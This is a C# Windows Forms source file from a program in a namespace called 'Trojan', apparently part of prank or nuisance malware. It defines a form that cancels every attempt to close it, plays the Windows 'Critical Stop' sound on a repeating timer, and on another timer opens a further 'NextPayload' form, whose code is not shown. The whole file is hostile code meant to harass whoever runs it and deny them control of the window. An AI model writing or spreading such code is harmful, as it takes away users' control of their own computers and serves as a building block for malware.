using System;
using System.Windows.Forms;
using System.Media;
using System.IO;

namespace Trojan
{
    public partial class Sounds : Form
    {
        private SoundPlayer sp;

        string soundFile = @"C:\Windows\Media\Windows Critical Stop.wav";

        public Sounds( )
        {
            InitializeComponent( );

            if ( File.Exists( soundFile ) ) sp = new SoundPlayer( @"C:\Windows\Media\Windows Critical Stop.wav" );
        }

        private void Sounds_FormClosing( object sender, FormClosingEventArgs e ) => e.Cancel = true;

        private void Sounds_Load( object sender, EventArgs e )
        {
            SoundTMR.Start( );
            NextPayloadTMR.Start( );
        }

        private void SoundTMR_Tick( object sender, EventArgs e )
        {
            SoundTMR.Stop( );
            sp.Play( );
            SoundTMR.Start( );
        }

        private void NextPayloadTMR_Tick( object sender, EventArgs e )
        {
            NextPayloadTMR.Stop( );

            var NextPayloadForm = new NextPayload( );

            NextPayloadForm.ShowDialog( );
            NextPayloadTMR.Start( );
        }
    }
}
